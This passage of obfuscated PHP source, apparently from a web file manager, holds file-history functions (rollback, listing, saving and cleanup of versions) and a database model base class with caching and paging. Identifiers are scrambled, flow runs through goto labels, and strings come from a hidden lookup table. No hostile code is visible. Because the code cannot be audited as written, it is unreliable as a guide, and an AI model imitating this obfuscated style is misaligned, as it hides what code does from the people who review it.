IO::move($AŠØ ŸåÒ÷[$fˆŒ²ÌÉÙ–[1118]], $Aºçİ’—½ğ, !1, $F„ˆ‚‘³º . $B•Ä‰‡»Àå); goto a‹‚ÓÅ„ª; BÇÁ¨ˆÁ˜³: $B•Ä‰‡»Àå = $fˆŒ²ÌÉÙ–[1106]; $F„ˆ‚‘³º = $F„ˆ‚‘³º ? $F„ˆ‚‘³º : get_path_this($cøÏĞ…ß†); $Aºçİ’—½ğ = $Aºçİ’—½ğ ? $Aºçİ’—½ğ : $AŠØ ŸåÒ÷[$fˆŒ²ÌÉÙ–[1117]]; goto BãÁµë÷ñì; Eëòß‡óíÄ: } public static function rollback($cŞ›ôÕ»œŞ, $a÷¾ôß¼«) { $c†É†±‚‹ =& $_SERVER[Šº]; $Dë„„ªØº¼ = self::listData($cŞ›ôÕ»œŞ); if (!$Dë„„ªØº¼) { return; } $bŞâğâ¬„” = IO::info($cŞ›ôÕ»œŞ); foreach ($Dë„„ªØº¼[$c†É†±‚‹[366]] as $cŠÄ˜ì†ŠŞ => $Aßµà›–ô•) { if ($Aßµà›–ô•[$c†É†±‚‹[392]] == $a÷¾ôß¼«) { self::add($cŞ›ôÕ»œŞ); $A×Ÿ£ÚŠŠê = $Dë„„ªØº¼[$c†É†±‚‹[1117]] . $Aßµà›–ô•[$c†É†±‚‹[28]]; $Dî±¥„Ÿª† = IO::copy($A×Ÿ£ÚŠŠê, IO::pathFather($cŞ›ôÕ»œŞ), REPEAT_REPLACE, $bŞâğâ¬„”[$c†É†±‚‹[28]]); if ($Dî±¥„Ÿª†) { self::remove($cŞ›ôÕ»œŞ, $a÷¾ôß¼«); } return $Dî±¥„Ÿª†; } } return !1; } public static function setDetail($D¥‚¯ŒŒáµ, $EØ‚¤ã®””, $f˜‹ù´é¸ô) { $aø¬¥ìË¤ =& $_SERVER[Šº]; $aÒ†ãÍ§‚Ş = self::listData($D¥‚¯ŒŒáµ); if (!$aÒ†ãÍ§‚Ş) { return; } foreach ($aÒ†ãÍ§‚Ş[$aø¬¥ìË¤[366]] as $B’÷Ïë•Ö => $cœ¢¹˜ç“) { if ($cœ¢¹˜ç“[$aø¬¥ìË¤[392]] == $EØ‚¤ã®””) { $aÒ†ãÍ§‚Ş[$aø¬¥ìË¤[366]][$B’÷Ïë•Ö][$aø¬¥ìË¤[1116]] = $f˜‹ù´é¸ô; self::saveData($aÒ†ãÍ§‚Ş[$aø¬¥ìË¤[1118]], $aÒ†ãÍ§‚Ş[$aø¬¥ìË¤[366]]); return !0; } } return !1; } public static function fileInfo($aª±ŒÑØìØ, $CÑ¾º¸á¶œ) { goto aÖ¯éŞ™Ëß; fîË‰Úé‚’: $c“Ïã²‚Š = $FÖäÃÉàñ‚[33]; foreach ($dˆâ·ì‚Æ‹[$FÖäÃÉàñ‚[366]] as $d¼²äÈô¤¬ => $BÎº‰·¤Ä²) { if ($BÎº‰·¤Ä²[$FÖäÃÉàñ‚[392]] != $CÑ¾º¸á¶œ) { continue; } $c“Ïã²‚Š = $dˆâ·ì‚Æ‹[$FÖäÃÉàñ‚[1117]] . $BÎº‰·¤Ä²[$FÖäÃÉàñ‚[28]]; break; } if (!$c“Ïã²‚Š) { show_json(LNG($FÖäÃÉàñ‚[105]), !1); } goto A¿óÌØ¤ùÔ; aÖ¯éŞ™Ëß: $FÖäÃÉàñ‚ =& $_SERVER[Šº]; $dˆâ·ì‚Æ‹ = self::listData($aª±ŒÑØìØ); if (!$dˆâ·ì‚Æ‹) { show_json(LNG($FÖäÃÉàñ‚[105]), !1); } goto fîË‰Úé‚’; A¿óÌØ¤ùÔ: return IO::info($c“Ïã²‚Š); goto DŸéµÇŸ—ø; DŸéµÇŸ—ø: } public static function fileOut($E”‘ø‰ò…¥, $DªŠòËİ‘, $Aš÷åß—øß = false) { $eŠŒãóƒ»¬ =& $_SERVER[Šº]; $EÔ»Ù¥ôµÈ = self::fileInfo($E”‘ø‰ò…¥, $DªŠòËİ‘); $F‡Ç¼ö¡ÏŞ =& $GLOBALS[$eŠŒãóƒ»¬[7]]; $Aš÷åß—øß = isset($F‡Ç¼ö¡ÏŞ[$eŠŒãóƒ»¬[1082]]) && $F‡Ç¼ö¡ÏŞ[$eŠŒãóƒ»¬[1082]] == 1; if (isset($F‡Ç¼ö¡ÏŞ[$eŠŒãóƒ»¬[29]]) && $F‡Ç¼ö¡ÏŞ[$eŠŒãóƒ»¬[29]] == $eŠŒãóƒ»¬[1119]) { return IO::fileOutImage($EÔ»Ù¥ôµÈ[$eŠŒãóƒ»¬[76]], $F‡Ç¼ö¡ÏŞ[$eŠŒãóƒ»¬[1120]]); } IO::fileOut($EÔ»Ù¥ôµÈ[$eŠŒãóƒ»¬[76]], $Aš÷åß—øß, get_path_this($E”‘ø‰ò…¥)); } public static function listData($fÄ´ò«ô…â, $e²ğÌÇ†å = true) { goto F­¡ã£Æ; c«„‰§¤Âø: $b¬Íº‘¾– = IO::getContent($Bğ»«ğã‡§[$Aê’¶£ê[1118]]); if ($b¬Íº‘¾–) { $Bá£§ã¥» = json_decode($b¬Íº‘¾–, !0); if (is_array($Bá£§ã¥»)) { $Bğ»«ğã‡§[$Aê’¶£ê[366]] = $Bá£§ã¥»; } } return $Bğ»«ğã‡§; goto CºóâÑƒˆ; F­¡ã£Æ: $Aê’¶£ê =& $_SERVER[Šº]; if ($e²ğÌÇ†å && !IO::exist($fÄ´ò«ô…â)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } goto f’æ‘«‚…„; f’æ‘«‚…„: if (substr($fÄ´ò«ô…â, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $A†¿Éßøİ = self::pathHistory($fÄ´ò«ô…â); $Bğ»«ğã‡§ = array($Aê’¶£ê[1118] => $A†¿Éßøİ . $Aê’¶£ê[1106], $Aê’¶£ê[1117] => rtrim(get_path_father($A†¿Éßøİ), $Aê’¶£ê[8]) . $Aê’¶£ê[8], $Aê’¶£ê[366] => array()); goto c«„‰§¤Âø; CºóâÑƒˆ: } private static function saveData($d„‰ù’ , $D“©ƒ÷šØô) { goto eœ·Ç‰À¾ğ; eœ·Ç‰À¾ğ: $EËŠÙ¢—«ƒ =& $_SERVER[Šº]; self::log($EËŠÙ¢—«ƒ[1121] . $d„‰ù’  . $EËŠÙ¢—«ƒ[68] . count($D“©ƒ÷šØô), $EËŠÙ¢—«ƒ[713]); if ($D“©ƒ÷šØô) { return IO::setContent($d„‰ù’ , json_encode($D“©ƒ÷šØô)); } goto dŞÕãï‘½’; a©»óË›: return !0; goto FÏÜéƒô„¢; dŞÕãï‘½’: $D¬ªœêÄ³ = IO::pathFather($d„‰ù’ ); IO::remove($d„‰ù’ ); self::clearEmptyFolder($D¬ªœêÄ³); goto a©»óË›; FÏÜéƒô„¢: } public static function clearEmptyFolder($b©ø®Äº±) { goto eÓ çŒ’“; Eé»«’š¹: self::clearEmptyFolder($AàÊ’¾—÷); goto A¦æô¹ñº; eÓ çŒ’“: $E„¦¨Ù›Ë‚ =& $_SERVER[Šº]; if (trim($b©ø®Äº±, $E„¦¨Ù›Ë‚[8]) == trim(self::$_historyBase, $E„¦¨Ù›Ë‚[8])) { return; } $AàÊ’¾—÷ = IO::pathFather($b©ø®Äº±); goto A®ÓÈ›ˆÅÇ; A®ÓÈ›ˆÅÇ: $Câ…›ÖÕôŒ = IO::has($b©ø®Äº±, !0); if ($Câ…›ÖÕôŒ[$E„¦¨Ù›Ë‚[202]] > 0 || $Câ…›ÖÕôŒ[$E„¦¨Ù›Ë‚[203]] > 0) { return; } IO::remove($b©ø®Äº±); goto Eé»«’š¹; A¦æô¹ñº: } private static function getBasePath() { goto e›¡ì“Íì²; e›¡ì“Íì²: $c¥Ğ³²ƒœ¹ =& $_SERVER[Šº]; $f×ÄÊø³… = Model($c¥Ğ³²ƒœ¹[1122])->get($c¥Ğ³²ƒœ¹[1123]); if (IO::exist($f×ÄÊø³…)) { return $f×ÄÊø³…; } goto a„Üì‘éÑ°; a„Üì‘éÑ°: $f×ÄÊø³… = DATA_PATH . $c¥Ğ³²ƒœ¹[1124]; $f×ÄÊø³… = IO::mkdir($f×ÄÊø³…); $f×ÄÊø³… = rtrim($f×ÄÊø³…, $c¥Ğ³²ƒœ¹[8]) . $c¥Ğ³²ƒœ¹[8]; goto fŠ™Ÿä³·³; fŠ™Ÿä³·³: file_put_contents($f×ÄÊø³… . $c¥Ğ³²ƒœ¹[1125], $c¥Ğ³²ƒœ¹[33]); Model($c¥Ğ³²ƒœ¹[1122])->set($c¥Ğ³²ƒœ¹[1123], $f×ÄÊø³…); return $f×ÄÊø³…; goto eÔÃªÃª—; eÔÃªÃª—: } } goto c“‡ø‡›‘; f™áô¡Í’: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\157\x64\151\146\x79\124\151\x6d\145", "\164\151\155\x65", "\x69\156\x73\145\162\x74\54\165\x70\x64\x61\164\145", "\146\165\156\x63\x74\151\157\156"), array("\x63\162\x65\141\164\x65\x54\151\x6d\145", "\164\x69\155\145", "\x69\x6e\163\x65\162\x74", "\x66\165\156\x63\x74\x69\157\x6e")); public function setDataAuto($eÈ‹ââŞã) { $this->dataAuto = $eÈ‹ââŞã; } public function __construct($b˜‡‰ÜÚÎ³ = '', $dæ£¾»¤¯® = '', $fğŒó”ÕÅµ = '') { parent::__construct($b˜‡‰ÜÚÎ³, $dæ£¾»¤¯®, $fğŒó”ÕÅµ); } public static function textEncode($B¿ÃÀÅ¬Ó) { if (!$B¿ÃÀÅ¬Ó) { return $B¿ÃÀÅ¬Ó; } $cŞ®Çƒ¼è = json_encode($B¿ÃÀÅ¬Ó); $cŞ®Çƒ¼è = preg_replace_callback($_SERVER[Šº][352], function ($A‹…Ô£‚È›) { return addslashes($A‹…Ô£‚È›[0]); }, $cŞ®Çƒ¼è); return json_decode($cŞ®Çƒ¼è); } public static function textDecode($B‘³‚ÖÖ†‘) { $D‚æŞ¸õ‘¬ =& $_SERVER[Šº]; $D„²ŞÚ·øì = json_encode($B‘³‚ÖÖ†‘); $D„²ŞÚ·øì = preg_replace_callback($D‚æŞ¸õ‘¬[353], function ($Bò‘‹‡âÆİ) { return $_SERVER[Šº][97]; }, $D„²ŞÚ·øì); return json_decode($D„²ŞÚ·øì); } protected $tableMeta = array(); protected function _beforeInsert(&$c½¹Ìæßİˆ, $aŞâÒÊ¸Â) { $BÓãÅÀ†ÏÒ =& $_SERVER[Šº]; if (!$this->checkDataAutoHas($BÓãÅÀ†ÏÒ[354])) { return; } $this->dataBeforeFilter($c½¹Ìæßİˆ, $BÓãÅÀ†ÏÒ[354]); } protected function _beforeUpdate(&$ağíëËßŞÑ, $B¯æÍº¿ËØ) { $bƒ­õ¼ÊçÏ =& $_SERVER[Šº]; if (!$this->checkDataAutoHas($bƒ­õ¼ÊçÏ[355])) { return; } $this->dataBeforeFilter($ağíëËßŞÑ, $bƒ­õ¼ÊçÏ[355]); } protected function _afterSelect(&$F÷Â¶ôôª´, $a®ÉÂù¦…º) { if (!is_array($F÷Â¶ôôª´)) { return; } if (!$this->checkDataAutoHas($_SERVER[Šº][356])) { return; } foreach ($F÷Â¶ôôª´ as &$b„íøšœº©) { $this->dataAfterFilter($b„íøšœº©); } unset($b„íøšœº©); } protected function _afterFind(&$FºŞÏ·Èšæ, $A”ƒ²ÂæäĞ) { if (!is_array($FºŞÏ·Èšæ)) { return; } if (!$this->checkDataAutoHas($_SERVER[Šº][356])) { return; } $this->dataAfterFilter($FºŞÏ·Èšæ); } public function setAutoIncrement($bÄâ¼’ò¨) { $AÖë¥¦Š = array($this->getPk() => $bÄâ¼’ò¨); $C›×ê©¢ƒ = $this->data($AÖë¥¦Š)->add(); if ($C›×ê©¢ƒ) { $this->delete($C›×ê©¢ƒ); } } public function getAutoIncrement() { $F¬šÉäÜ£‡ = $this->getTableName(); $E˜Â©èˆàÌ = $this->max($this->getPk()); $A„¤’Ş˜ß = $this->query("\x73\150\157\167\40\164\141\x62\154\145\x20\x73\164\141\164\165\x73\40\x77\x68\145\x72\x65\40\116\141\155\x65\75\47{$F¬šÉäÜ£‡}\47"); $bõ¦£º­Å½ = $A„¤’Ş˜ß[0][$_SERVER[Šº][357]]; $BÎÖ®ÀäíÃ = max($E˜Â©èˆàÌ, $bõ¦£º­Å½); return $BÎÖ®ÀäíÃ; } protected function _callBefore($FÉìÃ·ğß¨, $bšõ¯†šæ›) { return $this->cacheCallCheck($FÉìÃ·ğß¨, $bšõ¯†šæ›, !1); } protected function _callAfter($FŸ¶¨î¹Ëï, $Eø‚¢§‹†¸) { return $this->cacheCallCheck($FŸ¶¨î¹Ëï, $Eø‚¢§‹†¸, !0); } protected function cacheFunctionAlias($fâ—±½³Ü) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($Aì­®øÌ‚, $D‘ê…–‡‹ˆ, $c»ÔÂ”ªÕ = false) { $FÓ¦™„¢ë = $this->cacheFunctionAlias($D‘ê…–‡‹ˆ); if (!$FÓ¦™„¢ë) { return; } foreach ($FÓ¦™„¢ë as $d‘‚‚Ğ¤ÜÈ => $d‚¯†·ÔİÙ) { $déˆ“°÷Ëï = $d‚¯†·ÔİÙ[0]; $AĞİ†öµ = explode($_SERVER[Šº][47], $d‚¯†·ÔİÙ[1]); if ($Aì­®øÌ‚ == $d‘‚‚Ğ¤ÜÈ) { return $this->cacheFunctionGet($d‘‚‚Ğ¤ÜÈ, $déˆ“°÷Ëï); } if ($c»ÔÂ”ªÕ && in_array($Aì­®øÌ‚, $AĞİ†öµ)) { $this->cacheFunctionClear($d‘‚‚Ğ¤ÜÈ, $déˆ“°÷Ëï); } } } public function cacheFunctionGet($f¤¢à‰¥ŠÑ, $cÉƒá†”Í†) { $CªÎÕÔƒàÜ = $this->cacheKeyMake($f¤¢à‰¥ŠÑ, $cÉƒá†”Í†); $b²ÇœÍÉÄ¡ = Cache::get($CªÎÕÔƒàÜ); if (!is_array($b²ÇœÍÉÄ¡)) { $b²ÇœÍÉÄ¡ = call_user_func_array(array($this, $f¤¢à‰¥ŠÑ), array($cÉƒá†”Í†, !0)); Cache::set($CªÎÕÔƒàÜ, $b²ÇœÍÉÄ¡); } return $b²ÇœÍÉÄ¡; } public function cacheFunctionClear($C°×ˆÊ»Â, $D®éà»°×Î) { $EÛÁ£¯ˆ†‡ = $D®éà»°×Î; if (!is_array($D®éà»°×Î)) { $EÛÁ£¯ˆ†‡ = array($D®éà»°×Î); } foreach ($EÛÁ£¯ˆ†‡ as $B¼Ê ß¯Ç) { $b‰µ‘„  = $this->cacheKeyMake($C°×ˆÊ»Â, $B¼Ê ß¯Ç); Cache::remove($b‰µ‘„ ); } } private function cacheKeyMake($CÒ‚ Å˜äè, $A¾á¦—‚£°) { $b¯ï™øŒŠ =& $_SERVER[Šº]; return get_class($this) . $b¯ï™øŒŠ[71] . $CÒ‚ Å˜äè . $b¯ï™øŒŠ[358] . $A¾á¦—‚£°; } protected function selectPageReset() { $BÖ­¨Åº¹é =& $_SERVER[Šº]; if (isset($GLOBALS[$BÖ­¨Åº¹é[359]])) { return; } $GLOBALS[$BÖ­¨Åº¹é[359]] = isset($GLOBALS[$BÖ­¨Åº¹é[7]][$BÖ­¨Åº¹é[360]]) ? $GLOBALS[$BÖ­¨Åº¹é[7]][$BÖ­¨Åº¹é[360]] : !1; $GLOBALS[$BÖ­¨Åº¹é[361]] = isset($GLOBALS[$BÖ­¨Åº¹é[7]][$BÖ­¨Åº¹é[350]]) ? $GLOBALS[$BÖ­¨Åº¹é[7]][$BÖ­¨Åº¹é[350]] : !1; $GLOBALS[$BÖ­¨Åº¹é[7]][$BÖ­¨Åº¹é[360]] = !1; $GLOBALS[$BÖ­¨Åº¹é[7]][$BÖ­¨Åº¹é[350]] = !1; } protected function selectPageRestore() { $BŞ·µ—Öº =& $_SERVER[Šº]; if (!isset($GLOBALS[$BŞ·µ—Öº[359]])) { return; } $GLOBALS[$BŞ·µ—Öº[7]][$BŞ·µ—Öº[360]] = $GLOBALS[$BŞ·µ—Öº[359]]; $GLOBALS[$BŞ·µ—Öº[7]][$BŞ·µ—Öº[350]] = $GLOBALS[$BŞ·µ—Öº[361]]; unset($GLOBALS[$BŞ·µ—Öº[359]]); unset($GLOBALS[$BŞ·µ—Öº[361]]); } protected function selectPage($eå¼§¿‘šÊ = 200, $dŸã™ñ–§æ = 1) { goto DŸœ³ØÀ½¼; aØ©¾ÓĞå¥: $a…÷£ˆ‰ÖÊ = $DîÑ¢æã…Ÿ; $a…÷£ˆ‰ÖÊ[$bõŞ¼ëàÈ‹[362]] = array(); $eå¼§¿‘šÊ = intval($eå¼§¿‘šÊ); goto a•ø²ò¯”ô; a•ø²ò¯”ô: $eå¼§¿‘šÊ = $eå¼§¿‘šÊ <= 5 ? 5 : ($eå¼§¿‘šÊ >= $cëëù®öëÛ ? $cëëù®öëÛ : $eå¼§¿‘šÊ); $dŸã™ñ–§æ = intval(isset($in[$bõŞ¼ëàÈ‹[350]]) && $in[$bõŞ¼ëàÈ‹[350]] ? $in[$bõŞ¼ëàÈ‹[350]] : $dŸã™ñ–§æ); $dŸã™ñ–§æ = $dŸã™ñ–§æ <= 1 ? 1 : $dŸã™ñ–§æ; goto Eé»Âò…ê«; BÛëåÉ³›µ: $cëëù®öëÛ = 50000; $eå¼§¿‘šÊ = isset($in[$bõŞ¼ëàÈ‹[360]]) && $in[$bõŞ¼ëàÈ‹[360]] ? $in[$bõŞ¼ëàÈ‹[360]] : $eå¼§¿‘šÊ; if ($eå¼§¿‘šÊ === -1) { $in[$bõŞ¼ëàÈ‹[360]] = !1; $cëëù®öëÛ = 100000000; $eå¼§¿‘šÊ = $cëëù®öëÛ; } goto aØ©¾ÓĞå¥; eêŠ“Ö¶ÙÉ: return $b…ëĞ­Ä˜½; goto DêÏ‹èÏâÒ; Eé»Âò…ê«: $EÁØÄ‰…Ò™ = array(); $dÛ§Û‘â„ = 1; if ($dŸã™ñ–§æ == 1 && $dÛ§Û‘â„) { $this->optionsValue($DîÑ¢æã…Ÿ); $EÁØÄ‰…Ò™ = $this->page($dŸã™ñ–§æ, $eå¼§¿‘šÊ)->select(); $eš»š­¡ï¦ = is_array($EÁØÄ‰…Ò™) ? count($EÁØÄ‰…Ò™) : 0; if ($eš»š­¡ï¦ < $eå¼§¿‘šÊ) { $CÛÑ’áĞÔ” = 1; } else { $this->optionsValue($a…÷£ˆ‰ÖÊ); $eš»š­¡ï¦ = intval($this->count()); $CÛÑ’áĞÔ” = ceil($eš»š­¡ï¦ / $eå¼§¿‘šÊ); } } else { $this->optionsValue($a…÷£ˆ‰ÖÊ); $eš»š­¡ï¦ = intval($this->count()); $CÛÑ’áĞÔ” = ceil($eš»š­¡ï¦ / $eå¼§¿‘šÊ); $dŸã™ñ–§æ = $dŸã™ñ–§æ >= $CÛÑ’áĞÔ” ? $CÛÑ’áĞÔ” : $dŸã™ñ–§æ; $this->optionsValue($DîÑ¢æã…Ÿ); $EÁØÄ‰…Ò™ = $this->page($dŸã™ñ–§æ, $eå¼§¿‘šÊ)->select(); } goto dŞ¢Ä¹©—Á; DŸœ³ØÀ½¼: $bõŞ¼ëàÈ‹ =& $_SERVER[Šº]; global $in; $DîÑ¢æã…Ÿ = $this->optionsValue(); goto BÛëåÉ³›µ; dŞ¢Ä¹©—Á: if (!is_array($EÁØÄ‰…Ò™)) { $EÁØÄ‰…Ò™ = array(); } if ($CÛÑ’áĞÔ” == 1) { $eš»š­¡ï¦ = count($EÁØÄ‰…Ò™); } $b…ëĞ­Ä˜½ = array($bõŞ¼ëàÈ‹[363] => array($bõŞ¼ëàÈ‹[364] => $eš»š­¡ï¦, $bõŞ¼ëàÈ‹[360] => $eå¼§¿‘šÊ, $bõŞ¼ëàÈ‹[350] => $dŸã™ñ–§æ, $bõŞ¼ëàÈ‹[365] => $CÛÑ’áĞÔ”), $bõŞ¼ëàÈ‹[366] => $EÁØÄ‰…Ò™); goto eêŠ“Ö¶ÙÉ; DêÏ‹èÏâÒ: } protected function checkLength($AÜë–‹¬·, $a¿¶ÙˆÃ = 0, $bˆ¨ÀÕñÌÇ = '') { $DÌòö§ªÚ =& $_SERVER[Šº]; $a¿¶ÙˆÃ = $a¿¶ÙˆÃ ? $a¿¶ÙˆÃ : 65536; if (!$AÜë–‹¬· || strlen($AÜë–‹¬·) < $a¿¶ÙˆÃ) { return; } $bˆ¨ÀÕñÌÇ = $bˆ¨ÀÕñÌÇ ? $bˆ¨ÀÕñÌÇ . $DÌòö§ªÚ[68] : $DÌòö§ªÚ[33]; show_json($bˆ¨ÀÕñÌÇ . LNG($DÌòö§ªÚ[367]) . "\50{$a¿¶ÙˆÃ}\x29", !1); } protected function metaSet($FöØ“Ëƒöê, $F…º £¯ïˆ = null, $B¶ ˜ÑÍõ© = null) { goto Cèë®Îãè’; Cèë®Îãè’: $Aé–ªÕÃÎÌ =& $_SERVER[Šº]; if (!$this->tableMeta || !$FöØ“Ëƒöê) { return !1; } $cÌ¹Ğå†«Ğ = $this->tableMeta[$Aé–ªÕÃÎÌ[368]]; goto DàÑì¯‘Õ; a¯ªª…Ş¬Ï: if (is_null($F…º £¯ïˆ)) { return $c…ŠˆÌ˜ƒ->where(array($cÌ¹Ğå†«Ğ => $FöØ“Ëƒöê))->delete(); } if (is_null($B¶ ˜ÑÍõ©) && is_string($F…º £¯ïˆ)) { return $c…ŠˆÌ˜ƒ->where($f­ëƒÃˆ”•)->delete(); } $CÅ¦Á¶Œî = is_array($F…º £¯ïˆ) ? $F…º £¯ïˆ : array(); goto FÆ‚¥Ùó§; dÁæÄà†: $E¨‹÷‚Åª¬ = $Aé–ªÕÃÎÌ[372] . $this->tableMeta; CacheLock::lock($E¨‹÷‚Åª¬); $c…ŠˆÌ˜ƒ->where(array($cÌ¹Ğå†«Ğ => $FöØ“Ëƒöê))->addAll($e‡Çæ§ŞĞò, array(), !0); goto Dï¬‡»Ì¡; DàÑì¯‘Õ: $eÑ›Ø¡ï½î = $this->tableMeta[$Aé–ªÕÃÎÌ[369]]; $c…ŠˆÌ˜ƒ = Model($eÑ›Ø¡ï½î); $f­ëƒÃˆ”• = array($cÌ¹Ğå†«Ğ => $FöØ“Ëƒöê, $Aé–ªÕÃÎÌ[370] => $F…º £¯ïˆ); goto a¯ªª…Ş¬Ï; Dï¬‡»Ì¡: CacheLock::unlock($E¨‹÷‚Åª¬); return !0; goto e¶¶›ì†—; FÆ‚¥Ùó§: if (is_string($F…º £¯ïˆ)) { $CÅ¦Á¶Œî[$F…º £¯ïˆ] = $B¶ ˜ÑÍõ©; } $e‡Çæ§ŞĞò = array(); foreach ($CÅ¦Á¶Œî as $C¼‘«ÓÔò§ => $D»îÔ—ÜÂ) { $this->checkLength($D»îÔ—ÜÂ, !1, $eÑ›Ø¡ï½î . $Aé–ªÕÃÎÌ[4] . $C¼‘«ÓÔò§); $e‡Çæ§ŞĞò[] = array($cÌ¹Ğå†«Ğ => $FöØ“Ëƒöê, $Aé–ªÕÃÎÌ[93] => $C¼‘«ÓÔò§, $Aé–ªÕÃÎÌ[371] => $D»îÔ—ÜÂ); } goto dÁæÄà†; e¶¶›ì†—: } public function metaGet($D·ÕÛÌÕ÷½, $B–ªÈµôˆ = false) { goto Fæç‡²‰œö; CßºÙë‘÷: $DšÁÉíŸå¢ = Model($this->tableMeta[$f¹ÛÂ¼µË×[369]]); if ($B–ªÈµôˆ) { $C«×ÆÕ«Ä = array($A™á¾Ùîï¿ => $D·ÕÛÌÕ÷½, $f¹ÛÂ¼µË×[93] => $B–ªÈµôˆ); return $DšÁÉíŸå¢->where($C«×ÆÕ«Ä)->getField($f¹ÛÂ¼µË×[371]); } $C«×ÆÕ«Ä = array($A™á¾Ùîï¿ => $D·ÕÛÌÕ÷½); goto DôÀ‚Š‰Î‰; DôÀ‚Š‰Î‰: $f„‰®ç†À = $DšÁÉíŸå¢->field($f¹ÛÂ¼µË×[373])->where($C«×ÆÕ«Ä)->select(); $f„‰®ç†À = array_to_keyvalue($f„‰®ç†À, $f¹ÛÂ¼µË×[93], $f¹ÛÂ¼µË×[371]); return $f„‰®ç†À; goto d­Ø¹ö˜«ï; Fæç‡²‰œö: $f¹ÛÂ¼µË× =& $_SERVER[Šº]; if (!$this->tableMeta) { return array(); } $A™á¾Ùîï¿ = $this->tableMeta[$f¹ÛÂ¼µË×[368]]; goto CßºÙë‘÷; d­Ø¹ö˜«ï: } private function checkDataAutoHas($FÖÕ ‡ÌŸ) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $e¥£¹…ƒÉ) { if (in_array($FÖÕ ‡ÌŸ, explode($_SERVER[Šº][47], $e¥£¹…ƒÉ[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$E¿½äéÍ½„, $a›õ²ßÖõ) { $A÷ˆ…ó—¥à =& $_SERVER[Šº]; foreach ($this->dataAuto as $E•¾Á°ß¤â) { $FÜ‹ÉÀôÕ‘ = $E•¾Á°ß¤â[0]; if (!in_array($a›õ²ßÖõ, explode($A÷ˆ…ó—¥à[47], $E•¾Á°ß¤â[2]))) { continue; } switch (trim($E•¾Á°ß¤â[3])) { case $A÷ˆ…ó—¥à[318]: case $A÷ˆ…ó—¥à[319]: $bØÊ§º¤† = $E•¾Á°ß¤â[1]; $Bô‰Ë÷Øæ  = isset($E•¾Á°ß¤â[4]) ? (array) $E•¾Á°ß¤â[4] : array(); if ($bØÊ§º¤† == $A÷ˆ…ó—¥à[196] && array_key_exists($FÜ‹ÉÀôÕ‘, $E¿½äéÍ½„)) { if (!$E¿½äéÍ½„[$FÜ‹ÉÀôÕ‘]) { unset($E¿½äéÍ½„[$FÜ‹ÉÀôÕ‘]); } break; } if (isset($E¿½äéÍ½„[$FÜ‹ÉÀôÕ‘])) { array_unshift($Bô‰Ë÷Øæ , $E¿½äéÍ½„[$FÜ‹ÉÀôÕ‘]); } if ($A÷ˆ…ó—¥à[318] == $E•¾Á°ß¤â[3]) { $E¿½äéÍ½„[$FÜ‹ÉÀôÕ‘] = call_user_func_array($bØÊ§º¤†, $Bô‰Ë÷Øæ ); } else { $E¿½äéÍ½„[$FÜ‹ÉÀôÕ‘] = call_user_func_array(array(&$this, $bØÊ§º¤†), $Bô‰Ë÷Øæ ); } break; case $A÷ˆ…ó—¥à[270]: $E¿½äéÍ½„[$FÜ‹ÉÀôÕ‘] = $E¿½äéÍ½„[$E•¾Á°ß¤â[1]]; break; case $A÷ˆ…ó—¥à[291]: if (isset($E¿½äéÍ½„[$FÜ‹ÉÀôÕ‘]) && !is_string($E¿½äéÍ½„[$FÜ‹ÉÀôÕ‘])) { $E¿½äéÍ½„[$FÜ‹ÉÀôÕ‘] = json_encode_force($E¿½äéÍ½„[$FÜ‹ÉÀôÕ‘]); } break; case $A÷ˆ…ó—¥à[320]: if ($E¿½äéÍ½„[$FÜ‹ÉÀôÕ‘] === $A÷ˆ…ó—¥à[33]) { unset($E¿½äéÍ½„[$FÜ‹ÉÀôÕ‘]); } break; case $A÷ˆ…ó—¥à[321]: $E¿½äéÍ½„[$FÜ‹ÉÀôÕ‘] = $E•¾Á°ß¤â[1]; default: break; } } if ($a›õ²ßÖõ == $A÷ˆ…ó—¥à[354]) { $F÷îÆš•ï‰ = strtolower($this->db->getDbType()); if (strpos($F÷îÆš•ï‰, $A÷ˆ…ó—¥à[9]) !== 0) { return; } $FÊõ¢Â´·ï = $this->field(!0)->fields; $a„Ù‘°´Ë¾ = $FÊõ¢Â´·ï[$A÷ˆ…ó—¥à[249]]; if (isset($FÊõ¢Â´·ï[$A÷ˆ…ó—¥à[248]])) { unset($a„Ù‘°´Ë¾[$FÊõ¢Â´·ï[$A÷ˆ…ó—¥à[248]]]); } foreach ($a„Ù‘°´Ë¾ as $c…ÔñÔ¯ë÷ => $a›õ²ßÖõ) { if (!isset($E¿½äéÍ½„[$c…ÔñÔ¯ë÷])) { $E¿½äéÍ½„[$c…ÔñÔ¯ë÷] = $A÷ˆ…ó—¥à[33]; } } } } private function dataAfterFilter(&$e“Í™‚¸…™) { $A®à¹®Ø— =& $_SERVER[Šº]; foreach ($this->dataAuto as $eÂËË§·) { $aÁ£İ¯ç‹ = $eÂËË§·[0]; if (!in_array($A®à¹®Ø—[356], explode($A®à¹®Ø—[47], $eÂËË§·[2]))) { continue; } if (!isset($e“Í™‚¸…™[$aÁ£İ¯ç‹])) { continue; } switch (trim($eÂËË§·[3])) { case $A®à¹®Ø—[318]: case $A®à¹®Ø—[319]: $b‹ÊÊö¢ö = isset($eÂËË§·[4]) ? (array) $eÂËË§·[4] : array(); array_unshift($b‹ÊÊö¢ö, $e“Í™‚¸…™[$aÁ£İ¯ç‹]); if ($A®à¹®Ø—[318] == $eÂËË§·[3]) { $e“Í™‚¸…™[$aÁ£İ¯ç‹] = call_user_func_array($eÂËË§·[1], $b‹ÊÊö¢ö); } else { $e“Í™‚¸…™[$aÁ£İ¯ç‹] = call_user_func_array(array(&$this, $eÂËË§·[1]), $b‹ÊÊö¢ö); } break; case $A®à¹®Ø—[270]: $e“Í™‚¸…™[$aÁ£İ¯ç‹] = $e“Í™‚¸…™[$eÂËË§·[1]]; break; case $A®à¹®Ø—[291]: $bë£·éİ„Š = $e“Í™‚¸…™[$aÁ£İ¯ç‹]; $e“Í™‚¸…™[$aÁ£İ¯ç‹] = json_decode($bë£·éİ„Š, !0); if (is_null($e“Í™‚¸…™[$aÁ£İ¯ç‹])) { $e“Í™‚¸…™[$aÁ£İ¯ç‹] = $bë£·éİ„Š; } break; case $A®à¹®Ø—[320]: if ($e“Í™‚¸…™[$aÁ£İ¯ç‹] === 